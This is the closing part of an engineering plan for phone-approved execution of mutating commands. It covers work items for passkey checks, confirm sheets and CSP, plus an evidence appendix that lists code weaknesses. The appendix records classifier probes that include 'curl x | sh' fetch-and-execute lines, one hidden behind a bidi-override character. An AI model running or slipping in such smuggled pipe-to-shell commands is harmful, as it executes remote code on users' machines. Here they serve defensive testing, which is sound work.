| W3 | 6 | deck-remote | run endpoint for `mut`: cap per class (`run:mut`), assertion required for `mut`, finish re-runs `verify` and refuses if the sig MAC changed; passes `--expect-cwd/--expect-timeout` from the challenge and `--auth {method, cred, challenge}`; `phone_ok` false → 403 "laptop only" before any challenge | extend `tower_run_test` (injected `towerExec`): cap × class matrix; `mut` without assertion 403; `phone_ok` false 403; argv carries the expect params and `--auth`; env still exactly `runBangEnv()`; dup window still 409; one action-log line per attempt | M | partial: phase-1 endpoint with explicit env (`tower_run.go:78`) and dup window exist |
| W3 | 7 | deck-remote | confirm sheet for `mut`: verbatim line in monospace with escapes visible, class + phone sub-class, signed cwd and timeout, sig age, proposal age (F11) and kid, attempt n with previous rc and tail, "runs as you on blackbird with your credentials"; "laptop only" state with copy and no Run; passkey enrolment in Settings; sheet DOM built from `verify` JSON only; CSP header (no inline script, `connect-src 'self'`) | Playwright against the software-authenticator server: all sheet fields present; zero-width/bidi render visibly; laptop-only line has copy, no Run; CSP header present and the app still loads (inline-script audit) | M | not built |
| W4 | 8 | tower | gate flip `PHASE_RUNNABLE["phone"] = {ro, mut}`, its own commit, after 2–7, 10, 11 are merged and deployed | the phase-1 `class:mut via phone` refusal test flips: phone-ok fixture runs, laptop-only fixture refused | S | blocked on W1–W3 |
| W4 | 9 | tower + manual | `/retro` cross-check journal `via: phone` runs ↔ deck-remote action log; iPhone checklist: enrol from the TUI code, Face ID names the tailnet origin, LAN origin says "mutating needs the tailnet URL", terminal opens via ticket, one `gh pr merge` end to end with `auth` in the `running` record | script test on a fixture journal + log (one unmatched run flagged); manual checklist in the phase-2 report | S | blocked on 8 |

Order and dependencies: W1 items are independent; run tower (2, 3, 10) and deck-remote (4, 11) in
parallel. W2 (#5) needs #4's caps. W3 needs #3's `verify` shape and `--expect-*`/`--auth` flags and
#5's assertion; #7 needs #6. W4 only after the W1–W3 merges are deployed to prod (deck-remote
with `--tower-operator`, already live for phase 1). Then mint `run:mut` from the laptop (#4's local
path). P1 is unchanged: F7 b, F8 b, Keychain-ACL helper.

Notes for the builders:

- A tick re-sign (F11) changes the sig MAC, so a challenge issued just before it fails at finish
  under #5's binding. That is correct; the sheet should say "re-signed, try again" rather than a
  generic 403.
- The sheet's proposal age comes from the ask record's `ts`, not the signature, so re-signing
  cannot make an old line look fresh.
- #11 also covers terminal reconnects: each reconnect fetches a new ticket. Tickets are kept in
  memory, so a deck-remote restart voids them, which is fine at 30 s.

## Appendix: evidence

- Routes and auth: `main.go:303-310` (`s.auth` only), `main.go:328-329` (`authAct` on tower
  act/reply), `main.go:336` (mint behind `authShared`), `main.go:373-379` (`bearer()` reads
  `?token=`), `main.go:384-396` (`auth` accepts shared or any device token).
- Act chain: `tower.go:98-103` (identity forgeable from loopback, accepted), `tower.go:106-123`
  (`viaServeProxy` = loopback peer), `tower.go:127-131` (`bearerHeaderOnly`), `tower.go:133-160`
  (`towerActionOK`), `tower.go:312-332` (`towerDup` keyed on ask + text).
- Typed input: `askqueue.go:51-91` (`--transport tmux` on the composer path only);
  `approve.go:63-140` and `cli.go:366-371` (`send-keys 1`, Enter). Report
  `tower/reports/dr-typed/report.md` "Security note".
- Tokens: `tokens.go:38-56` (caps, `knownCaps = {act, doc}`), hashes on disk.
- PWA: `web/app.js:51-57` (token in `localStorage`), 60 `innerHTML` uses, `esc()` at 117, no CSP.
- Signing v2: `sign.py` (`canonical`, `_verify`: `sig-v1`, `tampered`, `sig-stale-params`,
  `expired`, `wrong-kid`), `params.py:workdir` (`isdir`, symlink-following), `journal.py:65-88`
  (`SIGNED_KEYS`, `sign_ask_data`), `.claude/skills/ask/SKILL.md:20-31`. Journal: 472 ask records,
  20 signed, all `v: 2`.
- Runner: `runner.py` (`PHASE_RUNNABLE = {ro}`, `check()`, `Lock`, `minimal_env` without
  `SSH_AUTH_SOCK`, `verify_ask` fields), `runs.py` (`fold` stale rule, `next_attempt`).
- Classifier probes (2026-10-21): `git push origin :old-branch` → mut; `git checkout -- .` → mut;
  `git pu​ll` → copy (unknown subcommand); `git pull‮; curl x | sh` → copy (same reason,
  by luck of placement); `git pull; curl x | sh` → mut.
- Prod: `~/Library/LaunchAgents/io.lunascens.deck-remote.plist` has no `--tower-operator`.
- deck-remote branch `feat/run-bang-p1` @ e12688e contains the design docs only; D1 to D4 are not
  built yet. Tower branch `tower/run-bang-p1` holds T3, T4, U2 (phase-1 report).
